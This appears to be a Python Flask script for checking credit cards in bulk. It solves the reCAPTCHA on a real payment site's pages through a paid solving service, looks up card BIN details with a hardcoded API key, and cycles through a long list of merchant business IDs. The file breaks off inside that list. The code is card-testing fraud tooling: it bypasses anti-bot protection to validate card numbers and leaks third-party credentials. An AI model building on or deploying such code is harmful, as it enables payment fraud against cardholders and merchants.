import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()


app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]


def criarTask():
    key = rkey()
    data = {
        "clientKey": "409154ed879c9e41c25703a6f92289bd",
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": f"https://www.payzer.com/Payment/ExternalMake/businessId/{key}",
            "websiteKey": "6LdRqCATAAAAAEtlufJFRFSgqjZeCRCKW978YHB5",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)


# def Saldo():
#     data = {
#         "clientKey": "409154ed879c9e41c25703a6f92289bd",
#         "task": {
#             "type": "RecaptchaV2EnterpriseTask",
#             "websiteURL": "https://www.eduwhere.com/secure/autopay_confirm.php",
#             "websiteKey": "6LfFHhQUAAAAAFFMGjELVU4DwN8oDECRFp1nCupe",
#         },
#     }
#     criar = requests.post(
#         "https://api.capmonster.cloud/createTask", verify=False, json=data
#     )
#     taskId = criar.json()["taskId"]
#     while True:
#         data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
#         resultado = requests.post(
#             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
#         )
#         print(resultado.text)
#         if '"status":"ready"' in resultado.text:
#             return resultado.json()["solution"]["gRecaptchaResponse"]
#         time.sleep(1)
        
        
def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)

keys = ["7492", "15273", "4908", "5255", "402", "11720", "7775", "2062", "551", "10108", "7653", "14781", "4285", "8828", "2252", "7895", "3709", "101" ,"115" ,"106" ,"108" ,"113" ,"118" ,"114" ,"112" ,"111" ,"124" ,"131" ,"128" ,"126" ,"133" ,"143" ,"144" ,"141" ,"150" ,"153" ,"155" ,"157" ,"162" ,"159" ,"169" ,"173" ,"171" ,"174" ,"165" ,"170" ,"178" ,"182" ,"184" ,"188" ,"191" ,"190" ,"186" ,"185" ,"183" ,"199" ,"197" ,"203" ,"206" ,"208" ,"209" ,"204" ,"207" ,"217" ,"210" ,"225" ,"221" ,"226" ,"241" ,"236" ,"249" ,"243" ,"245" ,"247" ,"255" ,"261" ,"264" ,"259" ,"269" ,"272" ,"273" ,"279" ,"283" ,"289" ,"281" ,"293" ,"296" ,"297" ,"301" ,"302" ,"304" ,"299" ,"295" ,"309" ,"316" ,"317" ,"318" ,"320" ,"313" ,"315" ,"322" ,"323" ,"319" ,"326" ,"325" ,"330" ,"329" ,"328" ,"333" ,"335" ,"339" ,"331" ,"347" ,"350" ,"343" ,"344" ,"354" ,"355" ,"346" ,"353" ,"364" ,"356" ,"372" ,"368" ,"376" ,"382" ,"386" ,"379" ,"389" ,"390" ,"396" ,"394" ,"398" ,"402" ,"400" ,"405" ,"407" ,"410" ,"415" ,"418" ,"416" ,"423" ,"424" ,"430" ,"434" ,"425" ,"441" ,"435" ,"452" ,"455" ,"449" ,"465" ,"470" ,"471" ,"461" ,"478" ,"475" ,"480" ,"484" ,"483" ,"489" ,"488" ,"485" ,"495" ,"494" ,"487" ,"501" ,"504" ,"498" ,"508" ,"511" ,"500" ,"513" ,"505" ,"509" ,"528" ,"522" ,"523" ,"534" ,"537" ,"535" ,"541" ,"543" ,"538" ,"544" ,"545" ,"549" ,"550" ,"552" ,"554" ,"551" ,"557" ,"565" ,"566" ,"570" ,"571" ,"560" ,"564" ,"573" ,"580" ,"572" ,"582" ,"583" ,"593" ,"586" ,"584" ,"592" ,"588" ,"590" ,"597" ,"604" ,"596" ,"599" ,"595" ,"609" ,"611" ,"605" ,"607" ,"619" ,"618" ,"622" ,"620" ,"631" ,"629" ,"634" ,"630" ,"633" ,"640" ,"637" ,"645" ,"644" ,"642" ,"646" ,"639" ,"660" ,"661" ,"670" ,"657" ,"665" ,"673" ,"674" ,"675" ,"672" ,"684" ,"677" ,"682" ,"680" ,"683" ,"692" ,"694" ,"690" ,"696" ,"697" ,"705" ,"704" ,"710" ,"703" ,"713" ,"716" ,"722" ,"714" ,"723" ,"719" ,"726" ,"725" ,"732" ,"734" ,"733" ,"735" ,"739" ,"741" ,"744" ,"751" ,"752" ,"754" ,"760" ,"753" ,"762" ,"765" ,"764" ,"770" ,"773" ,"777" ,"768" ,"775" ,"783" ,"785" ,"786" ,"790" ,"791" ,"795" ,"797" ,"799" ,"793" ,"805" ,"801" ,"800" ,"808" ,"810" ,"812" ,"815" ,"814" ,"807" ,"806" ,"819" ,"822" ,"825" ,"821" ,"816" ,"826" ,"830" ,"828" ,"844" ,"851" ,"850" ,"857" ,"854" ,"864" ,"865" ,"867" ,"869" ,"861" ,"862" ,"870" ,"877" ,"872" ,"876" ,"873" ,"881" ,"880" ,"884" ,"887" ,"882" ,"883" ,"891" ,"894" ,"896" ,"895" ,"902" ,"903" ,"905" ,"901" ,"908" ,"909" ,"913" ,"917" ,"915" ,"922" ,"923" ,"924" ,"934" ,"928" ,"931" ,"939" ,"933" ,"935" ,"942" ,"943" ,"952" ,"951" ,"954" ,"953" ,"956" ,"958" ,"955" ,"962" ,"965" ,"969","973" ,"975" ,"984" ,"990" ,"993" ,"978" ,"992" ,"995" ,"1000" ,"1010" ,"1012" ,"1013" ,"1009" ,"1019" ,"1023" ,"1022" ,"1026" ,"1028" ,"1021" ,"1033" ,"1038" ,"1037" ,"1034" ,"1032" ,"1044" ,"1039" ,"1040" ,"1045" ,"1052" ,"1054" ,"1056" ,"1047" ,"1050" ,"1060" ,"1043" ,"1063" ,"1061" ,"1067" ,"1065" ,"1069" ,"1076" ,"1081" ,"1083" ,"1084" ,"1086" ,"1090" ,"1094" ,"1095" ,"1096" ,"1098" ,"1100" ,"1101" ,"1106" ,"1107" ,"1108" ,"1110" ,"1103" ,"1104" ,"1099" ,"1113" ,"1118" ,"1119" ,"1125" ,"1128" ,"1129" ,"1127" ,"1131" ,"1120" ,"1136" ,"1121" ,"1135" ,"1139" ,"1143" ,"1145" ,"1146" ,"1149" ,"1144" ,"1141" ,"1152" ,"1155" ,"1150" ,"1147" ,"1158" ,"1154" ,"1162" ,"1165" ,"1161" ,"1170" ,"1172" ,"1166" ,"1177" ,"1174" ,"1180" ,"1184" ,"1186" ,"1183" ,"1181" ,"1192" ,"1187" ,"1193" ,"1194" ,"1189" ,"1191" ,"1188" ,"1200" ,"1205" ,"1207" ,"1201" ,"1202" ,"1203" ,"1213" ,"1212" ,"1206" ,"1209" ,"1217" ,"1218" ,"1204" ,"1214" ,"1210" ,"1223" ,"1221" ,"1224" ,"1226" ,"1227" ,"1230" ,"1234" ,"1225" ,"1235" ,"1236" ,"1219" ,"1240" ,"1243" ,"1244" ,"1237" ,"1242" ,"1251" ,"1256" ,"1252" ,"1254" ,"1238" ,"1261" ,"1260" ,"1262" ,"1263" ,"1266" ,"1267" ,"1265" ,"1255" ,"1274" ,"1271" ,"1273" ,"1272" ,"1264" ,"1276" ,"1277" ,"1259" ,"1279" ,"1281" ,"1270" ,"1278" ,"1283" ,"1285" ,"1280" ,"1287" ,"1289" ,"1282" ,"1295" ,"1294" ,"1296" ,"1300" ,"1288" ,"1290" ,"1291" ,"1299" ,"1301" ,"1302" ,"1309" ,"1311" ,"1312" ,"1313" ,"1314" ,"1316" ,"1317" ,"1322" ,"1321" ,"1323" ,"1325" ,"1318" ,"1332" ,"1329" ,"1330" ,"1320" ,"1326" ,"1334" ,"1338" ,"1340" ,"1342" ,"1333" ,"1341" ,"1347" ,"1346" ,"1349" ,"1343" ,"1354" ,"1351" ,"1361" ,"1352" ,"1360" ,"1364" ,"1365" ,"1368" ,"1374" ,"1375" ,"1381" ,"1372" ,"1390" ,"1385" ,"1383" ,"1384" ,"1386" ,"1387" ,"1391" ,"1376" ,"1382" ,"1393" ,"1394" ,"1397","1395" ,"1392" ,"1400" ,"1396" ,"1401" ,"1404" ,"1403" ,"1405" ,"1407" ,"1411" ,"1410" ,"1412" ,"1409" ,"1416" ,"1419" ,"1421" ,"1423" ,"1424" ,"1425" ,"1426" ,"1418" ,"1414" ,"1422" ,"1427" ,"1429" ,"1432" ,"1430" ,"1428" ,"1435" ,"1436" ,"1434" ,"1437" ,"1440" ,"1431" ,"1433" ,"1438" ,"1445" ,"1446" ,"1442" ,"1450" ,"1452" ,"1441" ,"1448" ,"1457" ,"1449" ,"1458" ,"1460" ,"1453" ,"1461" ,"1459" ,"1462" ,"1463" ,"1468" ,"1467" ,"1464" ,"1471" ,"1470" ,"1473" ,"1475" ,"1469" ,"1476" ,"1477" ,"1482" ,"1485" ,"1495" ,"1492" ,"1497" ,"1503" ,"1502" ,"1489" ,"1505" ,"1508" ,"1499" ,"1510" ,"1511" ,"1513" ,"1515" ,"1516" ,"1519" ,"1520" ,"1514" ,"1509" ,"1526" ,"1528" ,"1533" ,"1535" ,"1512" ,"1536" ,"1530" ,"1540" ,"1539" ,"1534" ,"1537" ,"1538" ,"1543" ,"1552" ,"1553" ,"1545" ,"1555" ,"1557" ,"1549" ,"1547" ,"1558" ,"1556" ,"1559" ,"1548" ,"1554" ,"1563" ,"1566" ,"1562" ,"1570" ,"1564" ,"1573" ,"1561" ,"1579" ,"1576" ,"1580" ,"1578" ,"1582" ,"1584" ,"1583" ,"1586" ,"1588" ,"1590" ,"1591" ,"1587" ,"1594" ,"1593" ,"1597" ,"1598" ,"1600" ,"1602" ,"1595" ,"1605" ,"1603" ,"1615" ,"1614" ,"1616" ,"1608" ,"1618" ,"1619" ,"1621" ,"1620" ,"1622" ,"1627" ,"1629" ,"1631" ,"1633" ,"1630" ,"1625" ,"1626" ,"1640" ,"1632" ,"1636" ,"1644" ,"1641" ,"1646" ,"1649" ,"1647" ,"1638" ,"1653" ,"1652" ,"1654" ,"1660" ,"1661" ,"1656" ,"1655" ,"1665" ,"1666" ,"1669" ,"1668" ,"1659" ,"1670" ,"1672" ,"1674" ,"1678" ,"1680" ,"1681" ,"1683" ,"1675" ,"1687" ,"1684" ,"1673" ,"1690" ,"1689" ,"1686" ,"1695" ,"1697" ,"1698" ,"1699" ,"1691" ,"1705" ,"1709" ,"1703" ,"1704" ,"1696" ,"1710" ,"1707" ,"1714" ,"1717" ,"1715" ,"1718" ,"1722" ,"1725" ,"1728" ,"1720" ,"1729" ,"1731" ,"1733" ,"1727" ,"1734" ,"1723" ,"1730" ,"1735" ,"1724" ,"1732" ,"1738" ,"1740" ,"1742" ,"1744" ,"1737" ,"1745" ,"1739" ,"1747" ,"1743" ,"1749" ,"1750" ,"1751" ,"1753" ,"1746" ,"1754" ,"1748" ,"1756" ,"1761" ,"1760" ,"1762" ,"1766" ,"1767" ,"1764" ,"1758" ,"1755" ,"1771" ,"1772" ,"1769" ,"1774" ,"1775" ,"1778" ,"1770" ,"1781" ,"1785" ,"1786" ,"1779" ,"1780" ,"1782" ,"1783" ,"1797" ,"1801" ,"1793" ,"1795" ,"1800" ,"1803" ,"1804" ,"1806" ,"1805" ,"1809" ,"1807" ,"1815" ,"1819" ,"1820" ,"1816" ,"1822" ,"1817" ,"1824" ,"1829" ,"1830" ,"1834" ,"1831" ,"1832" ,"1828" ,"1839" ,"1838" ,"1835" ,"1840" ,"1844" ,"1845" ,"1847" ,"1843" ,"1848" ,"1841" ,"1853" ,"1851" ,"1854" ,"1859" ,"1857" ,"1855" ,"1860" ,"1861" ,"1863" ,"1870" ,"1867" ,"1871" ,"1865" ,"1875" ,"1872" ,"1869" ,"1868" ,"1874" ,"1873" ,"1881" ,"1878" ,"1879" ,"1880" ,"1887" ,"1891" ,"1893" ,"1884" ,"1888" ,"1890" ,"1896" ,"1900" ,"1895" ,"1902" ,"1909" ,"1905" ,"1904" ,"1911" ,"1898" ,"1913" ,"1912" ,"1886" ,"1907" ,"1915" ,"1914" ,"1906" ,"1910" ,"1917" ,"1919" ,"1920" ,"1922" ,"1918" ,"1925" ,"1921" ,"1926" ,"1932" ,"1923" ,"1935" ,"1924" ,"1928" ,"1938" ,"1930" ,"1944" ,"1940" ,"1955" ,"1947" ,"1948" ,"1957" ,"1950" ,"1946" ,"1956" ,"1964" ,"1967" ,"1968" ,"1969" ,"1963" ,"1972" ,"1976" ,"1979" ,"1977" ,"1974" ,"1980" ,"1982" ,"1965" ,"1978" ,"1989" ,"1988" ,"1984" ,"1985" ,"1990" ,"1991" ,"1994" ,"1998" ,"1997" ,"2000" ,"2002" ,"2004" ,"2005" ,"2010" ,"2012" ,"2011" ,"2006" ,"2007" ,"2014" ,"2015" ,"2016" ,"2019" ,"2020" ,"2018" ,"2022" ,"2017" ,"2024" ,"2025" ,"2030" ,"2033" ,"2028" ,"2032" ,"2037" ,"2036" ,"2038" ,"2040" ,"2043" ,"2029" ,"2042" ,"2035" ,"2021" ,"2047" ,"2050" ,"2053" ,"2045" ,"2054" ,"2041" ,"2048" ,"2056" ,"2059" ,"2055" ,"2061" ,"2060" ,"2066" ,"2072" ,"2070" ,"2063" ,"2064" ,"2067" ,"2068" ,"2074" ,"2065" ,"2076" ,"2081" ,"2077" ,"2080" ,"2083" ,"2079" ,"2085" ,"2084" ,"2088" ,"2087" ,"2091" ,"2094" ,"2089" ,"2092" ,"2099" ,"2098" ,"2101" ,"2100" ,"2102" ,"2103" ,"2105" ,"2107" ,"2112" ,"2115" ,"2113" ,"2111" ,"2118" ,"2120" ,"2114" ,"2123" ,"2122" ,"2126" ,"2129" ,"2116" ,"2134" ,"2132" ,"2136" ,"2135" ,"2130" ,"2138" ,"2143" ,"2147" ,"2133" ,"2140" ,"2153" ,"2144" ,"2139" ,"2151" ,"2156" ,"2160" ,"2161" ,"2157" ,"2158" ,"2165" ,"2166" ,"2168" ,"2170" ,"2172" ,"2173" ,"2171" ,"2159" ,"2174" ,"2175" ,"2162" ,"2180" ,"2178" ,"2182" ,"2184" ,"2181" ,"2189" ,"2191" ,"2194" ,"2188" ,"2187" ,"2196" ,"2202" ,"2200" ,"2203" ,"2190" ,"2204" ,"2206" ,"2213" ,"2216" ,"2218" ,"2209" ,"2220" ,"2211" ,"2222" ,"2223" ,"2226" ,"2210" ,"2224" ,"2227" ,"2234" ,"2219" ,"2231" ,"2230" ,"2240" ,"2241" ,"2242" ,"2243" ,"2246" ,"2250" ,"2248" ,"2252" ,"2247" ,"2258" ,"2260" ,"2256" ,"2266" ,"2253" ,"2265" ,"2268" ,"2272" ,"2270" ,"2277" ,"2276" ,"2273" ,"2275" ,"2281" ,"2285" ,"2297" ,"2296" ,"2298" ,"2293" ,"2300" ,"2313" ,"2312" ,"2319" ,"2318" ,"2320" ,"2326" ,"2324" ,"2329" ,"2337" ,"2331" ,"2336" ,"2340" ,"2332" ,"2333" ,"2334" ,"2330" ,"2339" ,"2344" ,"2348" ,"2343" ,"2355" ,"2350" ,"2357" ,"2351" ,"2361" ,"2356" ,"2364" ,"2366" ,"2368" ,"2354" ,"2360" ,"2353" ,"2371" ,"2373" ,"2377" ,"2370" ,"2378" ,"2367" ,"2384" ,"2387" ,"2388" ,"2381" ,"2390" ,"2386" ,"2398" ,"2395" ,"2399" ,"2401" ,"2397" ,"2407" ,"2389" ,"2396" ,"2410" ,"2409" ,"2411" ,"2417" ,"2413" ,"2415" ,"2423" ,"2416" ,"2426" ,"2421" ,"2427" ,"2425" ,"2428" ,"2432" ,"2434" ,"2435" ,"2433" ,"2436" ,"2437" ,"2440" ,"2443" ,"2444" ,"2438" ,"2445" ,"2446" ,"2441" ,"2450" ,"2442" ,"2452" ,"2449" ,"2455" ,"2453" ,"2456" ,"2448" ,"2451" ,"2459" ,"2454" ,"2463" ,"2468" ,"2471" ,"2474" ,"2476" ,"2477" ,"2475" ,"2467" ,"2473" ,"2484" ,"2482" ,"2479" ,"2488" ,"2485" ,"2491" ,"2495" ,"2487" ,"2486" ,"2493" ,"2489" ,"2492" ,"2494" ,"2502" ,"2496" ,"2497" ,"2505" ,"2509" ,"2510" ,"2512" ,"2504" ,"2513" ,"2507" ,"2521" ,"2520" ,"2511" ,"2522" ,"2526" ,"2519" ,"2528" ,"2530" ,"2529" ,"2537" ,"2535" ,"2539" ,"2536" ,"2533" ,"2541" ,"2544" ,"2543" ,"2548" ,"2547" ,"2531" ,"2546" ,"2542" ,"2550" ,"2545" ,"2553" ,"2551" ,"2556" ,"2555" ,"2562" ,"2560" ,"2558" ,"2565" ,"2567" ,"2563" ,"2568" ,"2573" ,"2570" ,"2569" ,"2566" ,"2576" ,"2579" ,"2571" ,"2582" ,"2577" ,"2578" ,"2587" ,"2585" ,"2588" ,"2590" ,"2592" ,"2589" ,"2591" ,"2583" ,"2586" ,"2598" ,"2595" ,"2597" ,"2599" ,"2603" ,"2600" ,"2606" ,"2605" ,"2608" ,"2602" ,"2612" ,"2613" ,"2607" ,"2617" ,"2619" ,"2622" ,"2625" ,"2610" ,"2627" ,"2620" ,"2629" ,"2630" ,"2633" ,"2635" ,"2636" ,"2623" ,"2637" ,"2631" ,"2641" ,"2638" ,"2644" ,"2650" ,"2628" ,"2647" ,"2651" ,"2652" ,"2653" ,"2655" ,"2658" ,"2649" ,"2654" ,"2663" ,"2657" ,"2660" ,"2664" ,"2673" ,"2674" ,"2677" ,"2671" ,"2678" ,"2665" ,"2675" ,"2681" ,"2679" ,"2687" ,"2689" ,"2690" ,"2686" ,"2692" ,"2693" ,"2691" ,"2694" ,"2697" ,"2695" ,"2696" ,"2698" ,"2701" ,"2704" ,"2703" ,"2711" ,"2713" ,"2705" ,"2709" ,"2717" ,"2712" ,"2720" ,"2718" ,"2719" ,"2730" ,"2729" ,"2672" ,"2726" ,"2731" ,"2737" ,"2733" ,"2734" ,"2742" ,"2741" ,"2745" ,"2744" ,"2748" ,"2757" ,"2756" ,"2753" ,"2749" ,"2746" ,"2762" ,"2758" ,"2765" ,"2755" ,"2767" ,"2772" ,"2773" ,"2769" ,"2779" ,"2782" ,"2780" ,"2781" ,"2776" ,"2778" ,"2783" ,"2788" ,"2784" ,"2790" ,"2786" ,"2793" ,"2798" ,"2794" ,"2787" ,"2802" ,"2792" ,"2795" ,"2799" ,"2791" ,"2800" ,"2805" ,"2801" ,"2804" ,"2809" ,"2810" ,"2803" ,"2811" ,"2814" ,"2813" ,"2815" ,"2816" ,"2818" ,"2825" ,"2824" ,"2826" ,"2829" ,"2833" ,"2831" ,"2839" ,"2835" ,"2834" ,"2841" ,"2843" ,"2838" ,"2846" ,"2852" ,"2854" ,"2845" ,"2849" ,"2856" ,"2844" ,"2855" ,"2858" ,"2863" ,"2864" ,"2857" ,"2865" ,"2867" ,"2853" ,"2850" ,"2861" ,"2872" ,"2873" ,"2875" ,"2878" ,"2879" ,"2881" ,"2882" ,"2886" ,"2889" ,"2890" ,"2883" ,"2891" ,"2884" ,"2893" ,"2894" ,"2892" ,"2896" ,"2897" ,"2899" ,"2900" ,"2903" ,"2902" ,"2905" ,"2906" ,"2901" ,"2904" ,"2910" ,"2916" ,"2918" ,"2909" ,"2911" ,"2920" ,"2917" ,"2924" ,"2912" ,"2927" ,"2922" ,"2928" ,"2930" ,"2931" ,"2919" ,"2939" ,"2933" ,"2942" ,"2943" ,"2941" ,"2937" ,"2938" ,"2946" ,"2951" ,"2948" ,"2945" ,"2949" ,"2960" ,"2957" ,"2962" ,"2963" ,"2961" ,"2955" ,"2956" ,"2950" ,"2977" ,"2982" ,"2976" ,"2983" ,"2980" ,"2975" ,"2985" ,"2979" ,"2978" ,"2984" ,"2987" ,"2974" ,"2981" ,"2988" ,"2989" ,"2996" ,"2998" ,"2970" ,"3003" ,"2994" ,"3004" ,"3001" ,"2997" ,"3006" ,"3007" ,"3009" ,"3011" ,"3012" ,"3010" ,"3018" ,"3014" ,"3023" ,"3021" ,"3020" ,"3022" ,"3024" ,"3025" ,"3027" ,"3019" ,"3032" ,"3033" ,"3036" ,"3031" ,"3037" ,"3040" ,"3044" ,"3029" ,"3041" ,"3046" ,"3039" ,"3047" ,"3048" ,"3028" ,"3050" ,"3049" ,"3053" ,"3051" ,"3060" ,"3056" ,"3061" ,"3054" ,"3064" ,"3065" ,"3067" ,"3058" ,"3069" ,"3062" ,"3066" ,"3071" ,"3068" ,"3072" ,"3073" ,"3063" ,"3075" ,"3074" ,"3080" ,"3070" ,"3077" ,"3081" ,"3085" ,"3087" ,"3088" ,"3084" ,"3093" ,"3095" ,"3094" ,"3091" ,"3096" ,"3089" ,"3100" ,"3102" ,"3103" ,"3099" ,"3107" ,"3101" ,"3110" ,"3109" ,"3106" ,"3108" ,"3090" ,"3117" ,"3119" ,"3121" ,"3122" ,"3126" ,"3128" ,"3124" ,"3131" ,"3123" ,"3139" ,"3142" ,"3146" ,"3144" ,"3148" ,"3153" ,"3152" ,"3154" ,"3147" ,"3132" ,"3162" ,"3160" ,"3156" ,"3158" ,"3167" ,"3168" ,"3171" ,"3157" ,"3163" ,"3172" ,"3174" ,"3179" ,"3175" ,"3169" ,"3185" ,"3180" ,"3184" ,"3181" ,"3183" ,"3178" ,"3192" ,"3194" ,"3190" ,"3195" ,"3198" ,"3197" ,"3191" ,"3193" ,"3200" ,"3209" ,"3202" ,"3203" ,"3213" ,"3210" ,"3215" ,"3217" ,"3212" ,"3221" ,"3219" ,"3223" ,"3224" ,"3228" ,"3227" ,"3220" ,"3226" ,"3232" ,"3234" ,"3233" ,"3237" ,"3242" ,"3238" ,"3240" ,"3243" ,"3245" ,"3241" ,"3248" ,"3246" ,"3251" ,"3250" ,"3253" ,"3258" ,"3254" ,"3249" ,"3257" ,"3264" ,"3262" ,"3265" ,"3268" ,"3270" ,"3269" ,"3271" ,"3277" ,"3273" ,"3279" ,"3274" ,"3283" ,"3275" ,"3285" ,"3289" ,"3288" ,"3291" ,"3292" ,"3290" ,"3293" ,"3296" ,"3302" ,"3305" ,"3306" ,"3295" ,"3309" ,"3299" ,"3303" ,"3311" ,"3308" ,"3300" ,"3316" ,"3318" ,"3320" ,"3322" ,"3323" ,"3326" ,"3324" ,"3319" ,"3331" ,"3325" ,"3336" ,"3337" ,"3338" ,"3332" ,"3342" ,"3344" ,"3347" ,"3346" ,"3348" ,"3341" ,"3353" ,"3350" ,"3360" ,"3367" ,"3371" ,"3374" ,"3363" ,"3376" ,"3377" ,"3368" ,"3369" ,"3372" ,"3381" ,"3383" ,"3384" ,"3385" ,"3386" ,"3394" ,"3398" ,"3400" ,"3399" ,"3395" ,"3404" ,"3407" ,"3408" ,"3409" ,"3412" ,"3411" ,"3413" ,"3415" ,"3418" ,"3410" ,"3405" ,"3420" ,"3416" ,"3423" ,"3403" ,"3428" ,"3425" ,"3433" ,"3434" ,"3427" ,"3430" ,"3436" ,"3431" ,"3440" ,"3439" ,"3441" ,"3444" ,"3442" ,"3447" ,"3448" ,"3446" ,"3445" ,"3452" ,"3443" ,"3456" ,"3453" ,"3449" ,"3455" ,"3458" ,"3459" ,"3461" ,"3462" ,"3454" ,"3467" ,"3468" ,"3460" ,"3466" ,"3469" ,"3463" ,"3470" ,"3473" ,"3479" ,"3472" ,"3486" ,"3487" ,"3482" ,"3483" ,"3492" ,"3488" ,"3493" ,"3497" ,"3496" ,"3508" ,"3509" ,"3505" ,"3502" ,"3503" ,"3511" ,"3510" ,"3514" ,"3515" ,"3516" ,"3519" ,"3520" ,"3521" ,"3524" ,"3523" ,"3530" ,"3538" ,"3539" ,"3536" ,"3545" ,"3535" ,"3548" ,"3546" ,"3549" ,"3544" ,"3541" ,"3547" ,"3550" ,"3557" ,"3565" ,"3563" ,"3562" ,"3558" ,"3569" ,"3571" ,"3568" ,"3575" ,"3574" ,"3570" ,"3577" ,"3581" ,"3580" ,"3579" ,"3576" ,"3587" ,"3586" ,"3589" ,"3592" ,"3578" ,"3582" ,"3593" ,"3588" ,"3596" ,"3595" ,"3598" ,"3594" ,"3603" ,"3610" ,"3611" ,"3606" ,"3608" ,"3599" ,"3602" ,"3607" ,"3601" ,"3614" ,"3600" ,"3605" ,"3618" ,"3613" ,"3622" ,"3624" ,"3626" ,"3617" ,"3629" ,"3632" ,"3625" ,"3635" ,"3634" ,"3636" ,"3630" ,"3638" ,"3620" ,"3641" ,"3646" ,"3637" ,"3644" ,"3648" ,"3643" ,"3651" ,"3654" ,"3656" ,"3645" ,"3655" ,"3657" ,"3649" ,"3659" ,"3661" ,"3664" ,"3667" ,"3668" ,"3666" ,"3671" ,"3673" ,"3674" ,"3672" ,"3675" ,"3677" ,"3679" ,"3680" ,"3681" ,"3695" ,"3699" ,"3704" ,"3700" ,"3709" ,"3711" ,"3714" ,"3713" ,"3716" ,"3717" ,"3712" ,"3721" ,"3719" ,"3720" ,"3731" ,"3732" ,"3736" ,"3738" ,"3741" ,"3742" ,"3743" ,"3744" ,"3747" ,"3753" ,"3754" ,"3752" ,"3757" ,"3756" ,"3758" ,"3762" ,"3763" ,"3764" ,"3765" ,"3759" ,"3767" ,"3771" ,"3778" ,"3772" ,"3782" ,"3779" ,"3783" ,"3781" ,"3789" ,"3793" ,"3791" ,"3796" ,"3792" ,"3802" ,"3803" ,"3808" ,"3807" ,"3816" ,"3818" ,"3819" ,"3821" ,"3795" ,"3823" ,"3825" ,"3824" ,"3822" ,"3829" ,"3830" ,"3833" ,"3828" ,"3826" ,"3831" ,"3838" ,"3841" ,"3836" ,"3843" ,"3839" ,"3845" ,"3850" ,"3848" ,"3854" ,"3855" ,"3861" ,"3860" ,"3859" ,"3857" ,"3864" ,"3869" ,"3866" ,"3871" ,"3878" ,"3879" ,"3883" ,"3884" ,"3885" ,"3886" ,"3892" ,"3895" ,"3897" ,"3899" ,"3891" ,"3901" ,"3903" ,"3905" ,"3898" ,"3894" ,"3911" ,"3918" ,"3915" ,"3916" ,"3919" ,"3913" ,"3927" ,"3928" ,"3932" ,"3937" ,"3933" ,"3934" ,"3948" ,"3942" ,"3944" ,"3951" ,"3954" ,"3930" ,"3947" ,"3956" ,"3963" ,"3965" ,"3967" ,"3960" ,"3968" ,"3971" ,"3970" ,"3973" ,"3969" ,"3978" ,"3972" ,"3979" ,"3980" ,"3976" ,"3985" ,"3984" ,"3986" ,"3982" ,"3987" ,"3981" ,"3993" ,"3990" ,"3992" ,"3997" ,"3998" ,"3996" ,"3999" ,"3995" ,"3994" ,"4000" ,"4006" ,"4011" ,"4007" ,"4008" ,"4015" ,"4017" ,"4019" ,"4021" ,"4014" ,"4004" ,"4025" ,"4020" ,"4029" ,"4035" ,"4038" ,"4036" ,"4043" ,"4037" ,"4044" ,"4039" ,"4051" ,"4046" ,"4054" ,"4057" ,"4055" ,"4059" ,"4073" ,"4065" ,"4077" ,"4069" ,"4082" ,"4081" ,"4078" ,"4087" ,"4088" ,"4090" ,"4092" ,"4095" ,"4100" ,"4101" ,"4096" ,"4098" ,"4097" ,"4102" ,"4103" ,"4106" ,"4104" ,"4111" ,"4112" ,"4113" ,"4117" ,"4118" ,"4124" ,"4125" ,"4123" ,"4127" ,"4129" ,"4122" ,"4131" ,"4133" ,"4135" ,"4130" ,"4138" ,"4139" ,"4134" ,"4143" ,"4136" ,"4141" ,"4147" ,"4150" ,"4142" ,"4152" ,"4145" ,"4148" ,"4155" ,"4154" ,"4162" ,"4157" ,"4156" ,"4167" ,"4172" ,"4170" ,"4173" ,"4177" ,"4168" ,"4174" ,"4178" ,"4169" ,"4179" ,"4175" ,"4181" ,"4182" ,"4180" ,"4188" ,"4190" ,"4187" ,"4189" ,"4191" ,"4194" ,"4197" ,"4198" ,"4200" ,"4199" ,"4204" ,"4201" ,"4206" ,"4205" ,"4196" ,"4208" ,"4211" ,"4213" ,"4209" ,"4214" ,"4221" ,"4207" ,"4216" ,"4226" ,"4223" ,"4229" ,"4228" ,"4219" ,"4217" ,"4227" ,"4236" ,"4241" ,"4238" ,"4242" ,"4245" ,"4235" ,"4240" ,"4247" ,"4246" ,"4250" ,"4252" ,"4251" ,"4259" ,"4244" ,"4257" ,"4255" ,"4262" ,"4261" ,"4254" ,"4267" ,"4270" ,"4274" ,"4272" ,"4277" ,"4275" ,"4265" ,"4279" ,"4280" ,"4287" ,"4285" ,"4284" ,"4281" ,"4288" ,"4297" ,"4298" ,"4291" ,"4294" ,"4295" ,"4304" ,"4305" ,"4301" ,"4303" ,"4299" ,"4306" ,"4300" ,"4307" ,"4309" ,"4310" ,"4313" ,"4316" ,"4317" ,"4318" ,"4314" ,"4322" ,"4311" ,"4315" ,"4319" ,"4321" ,"4326" ,"4330" ,"4325" ,"4324" ,"4331" ,"4337" ,"4341" ,"4348" ,"4346" ,"4347" ,"4351" ,"4356" ,"4357" ,"4360" ,"4344" ,"4359" ,"4352" ,"4367" ,"4370" ,"4364" ,"4372" ,"4380" ,"4378" ,"4383" ,"4386" 